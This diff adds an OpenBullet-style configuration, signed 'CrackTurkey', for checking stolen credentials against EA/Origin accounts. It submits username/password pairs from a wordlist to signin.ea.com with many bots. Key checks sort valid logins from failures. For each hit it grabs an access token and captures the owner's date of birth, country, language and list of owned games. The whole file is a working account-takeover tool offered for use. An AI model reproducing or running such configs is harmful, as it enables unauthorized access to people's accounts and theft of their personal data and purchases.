@@ -1,0 +1,195 @@
+[SETTINGS]
+{
+  "Name": "Origin NEW",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-05T14:31:56.0789349+03:00",
+  "AdditionalInfo": "Sağlam Proxy ister",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey FUNCTION GetRandomUA 
+
+#CrackTurkey FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+#CrackTurkey FUNCTION URLEncode "<PASS>" -> VAR "P" 
+
+#CrackTurkey REQUEST GET "https://accounts.ea.com/connect/auth?response_type=code&client_id=ORIGIN_SPA_ID&display=originXWeb/login&locale=en_US&release_type=prod&redirect_uri=https://www.origin.com/views/login.html" 
+  
+  HEADER "Host: accounts.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.origin.com/rus/en-us/store" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#CrackTurkey PARSE "<ADDRESS>" LR "" "" -> VAR "URL" 
+
+#CrackTurkey FUNCTION Length "email=<U>&password=<P>&_eventId=submit&cid=HTtEqf6SmlCUSNcg4Uea8TTfxhfiyDfw&showAgeUp=true&googleCaptchaResponse=&thirdPartyCaptchaResponse=&_rememberMe=on&rememberMe=on" -> VAR "len" 
+
+#CrackTurkey REQUEST POST "<ADDRESS>" 
+  CONTENT "email=<U>&password=<P>&_eventId=submit&cid=HTtEqf6SmlCUSNcg4Uea8TTfxhfiyDfw&showAgeUp=true&googleCaptchaResponse=&thirdPartyCaptchaResponse=&_rememberMe=on&rememberMe=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: signin.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://signin.ea.com" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: <ADDRESS>" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: <len>" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "class=\"otkinput-errormsg otkc\"" 
+    KEY "Your credentials are incorrect or have expired. Please try again or reset your password." 
+    KEY "Your credentials are incorrect or have expired." 
+  KEYCHAIN Success AND 
+    KEY "latestSuccessLogin" 
+    KEY "<COOKIES(webun)>" EqualTo "<USER>" 
+    KEY "<COOKIES(_nx_mpcid)>" Exists 
+
+#CrackTurkey PARSE "<SOURCE>" LR "window.location = \"" "\";" -> VAR "FID" 
+
+#CrackTurkey REQUEST GET "<FID>" 
+  
+  HEADER "Host: accounts.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "DNT: 1" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: <URL>" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
+  HEADER "Cookie: _nx_mpcid=47e353ca-79ad-442c-8cf7-cde889adb49d" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#CrackTurkey REQUEST GET "https://accounts.ea.com/connect/auth?client_id=ORIGIN_JS_SDK&response_type=token&redirect_uri=nucleus:rest&prompt=none&release_type=prod" 
+  
+  HEADER "Host: accounts.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "DNT: 1" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.origin.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.origin.com/usa/en-us/profile/achievements" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+#CrackTurkey REQUEST GET "https://gateway.ea.com/proxy/identity/pids/me" 
+  
+  HEADER "Host: gateway.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Include-UnderAge: true" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "DNT: 1" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "X-Extended-Pids: true" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.origin.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.origin.com/usa/en-us/profile/achievements" 
+  HEADER "Accept-Language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "pidId" -> VAR "PID" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "dob" -> CAP "Doğum Tarihi" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "country" -> CAP "Ülke" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "language" CreateEmpty=FALSE -> CAP "Dil" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "locale" CreateEmpty=FALSE -> CAP "Yerel" 
+
+#CrackTurkey REQUEST GET "https://api2.origin.com/ecommerce2/consolidatedentitlements/<PID>?machine_hash=1" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/vnd.origin.v3+json; x-cache/force-write" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7" 
+  HEADER "authtoken: <TOKEN>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://www.origin.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.origin.com/gbr/en-us/profile/games" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: <UA>" 
+
+#CrackTurkey FUNCTION CountOccurrences "offerPath" "<SOURCE>" -> CAP "Toplam Oyun" 
+
+#CrackTurkey PARSE "<SOURCE>" JSON "offerPath" Recursive=TRUE CreateEmpty=FALSE -> CAP "Oyunlar" 
+
+#CrackTurkey KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Oyunlar>" EqualTo "[]" 
+    KEY "<Oyunlar>" DoesNotExist 
+    KEY "<Toplam Oyun>" EqualTo "0" 
+
